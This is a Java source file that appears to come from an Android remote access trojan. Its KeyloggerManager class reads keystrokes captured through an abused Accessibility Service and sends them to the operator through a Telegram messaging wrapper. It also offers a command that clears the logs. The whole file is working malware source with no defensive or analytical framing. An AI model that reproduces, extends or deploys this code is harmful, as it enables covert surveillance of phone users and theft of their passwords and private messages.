package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;

public class KeyloggerManager {
    private Context context;

    public KeyloggerManager(Context context) { this.context = context; }

    public void sendLogs() {
        AccessibilityService service = AccessibilityService.getInstance();
        if (service != null) {
            String logs = service.dumpKeylog();
            if (logs.isEmpty()) {
                TelegramApi.sendMessage("⌨ No new logs recorded.");
            } else {
                TelegramApi.sendMessage("<b>⌨ Keylogger Data:</b>\n\n<code>" + logs + "</code>");
            }
        } else {
            TelegramApi.sendMessage("❌ Accessibility Service not active.");
        }
    }

    public void clearLogs() {
        AccessibilityService service = AccessibilityService.getInstance();
        if (service != null) {
            service.clearKeylog();
            TelegramApi.sendMessage("✅ Logs cleared.");
        }
    }
}
